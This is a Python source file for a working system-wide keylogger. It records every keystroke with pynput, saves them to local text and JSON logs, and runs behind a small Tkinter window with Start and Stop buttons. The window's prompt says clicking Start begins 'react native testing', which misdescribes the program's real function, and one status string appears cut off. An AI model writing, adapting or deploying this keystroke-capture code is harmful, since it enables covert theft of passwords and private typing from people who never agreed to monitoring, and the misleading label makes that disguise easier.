import os
from tkinter import CENTER as _CENTER
from tkinter import RIGHT as _RIGHT
from tkinter import LEFT as _LEFT
from tkinter import Tk as _Tk
from tkinter import Button as _Button
from tkinter import Label as _Label
from pynput import keyboard as _keyboard
from typing import Any as _Any
from datetime import datetime as _dt
from json import dumps as _dumps

# Globals
keys_used: list[dict[str, str]] = []
is_logging: bool = False
flag: bool = False  # Per-key press/hold flag (simplified)
keys: str = ""

now: _dt = _dt.now()  # Unused, but kept for completeness


def get_key_str(key: _Any) -> str:
    """Convert pynput key to a printable string."""
    if key is None:
        return '[unknown]'
    
    # Handle KeyCode with char
    if hasattr(key, 'char') and key.char is not None:
        return key.char
    
    # Fallback for special keys, KeyCode without char, or other
    special_map = {
        _keyboard.Key.space: ' ',
        _keyboard.Key.enter: '\n',
        _keyboard.Key.tab: '\t',
        _keyboard.Key.backspace: '[BACKSPACE]',
        _keyboard.Key.shift: '[SHIFT]',
        _keyboard.Key.ctrl: '[CTRL]',
        _keyboard.Key.alt: '[ALT]',
        _keyboard.Key.cmd: '[CMD]',
        # Add more Key objects as needed
    }
    if isinstance(key, _keyboard.Key):
        return special_map.get(key, str(key))
    
    # For KeyCode without char or other types
    return str(key)


def generate_text_log(key_str: str) -> None:
    """Generates a text log file containing the recorded keystrokes."""
    with open("./out/key_log.txt", "w") as KEYS:
        KEYS.write(key_str)


def generate_json_file(used_keys: list[dict[str, str]]) -> None:
    """Generates a JSON log file with keystroke events."""
    with open("./out/key_log.json", "w") as key_log:
        key_log.write(_dumps(used_keys, indent=2))


def on_press(key: _Any) -> None:
    """Handles key press events, logging if active."""
    global flag, keys_used
    if not is_logging:
        return

    key_str = get_key_str(key)
    if not flag:
        keys_used.append({"Pressed": key_str})
        flag = True

    generate_json_file(keys_used)  # Write on press (optional; could move to release)


def on_release(key: _Any) -> None:
    """Handles key release events and updates log files."""
    global flag, keys_used, keys
    if not is_logging:
        return

    key_str = get_key_str(key)
    keys_used.append({"Released": key_str})

    keys += key_str
    generate_text_log(keys)
    generate_json_file(keys_used)  # Write on release

    if flag:
        flag = False


# Create listener instance (starts later)
_LISTENER = _keyboard.Listener(on_press=on_press, on_release=on_release)


def start_keylogger() -> None:
    """Initiates keystroke logging (toggles flag)."""
    global is_logging
    is_logging = True
    label.config(
        text="[+] Logger is running!\n[!]'"
    )
    start_button.config(state="disabled")
    stop_button.config(state="normal")


def stop_keylogger() -> None:
    """Stops keystroke logging (toggles flag)."""
    global is_logging
    is_logging = False
    label.config(text="Logger stopped.")
    start_button.config(state="normal")
    stop_button.config(state="disabled")


if __name__ == "__main__":
    # Ensure output dir exists
    os.makedirs("./out", exist_ok=True)

    root = _Tk()
    root.title("Logger")

    label = _Label(root, text='Click "Start" to begin react native testing...')
    label.config(anchor=_CENTER)
    label.pack()

    start_button = _Button(root, text="Start", command=start_keylogger)
    start_button.pack(side=_LEFT)

    stop_button = _Button(root, text="Stop", command=stop_keylogger, state="disabled")
    stop_button.pack(side=_RIGHT)

    root.geometry("250x250")

    # Start listener BEFORE mainloop to avoid macOS crash
    _LISTENER.start()

    try:
        root.mainloop()
    finally:
        # Clean stop on exit
        _LISTENER.stop()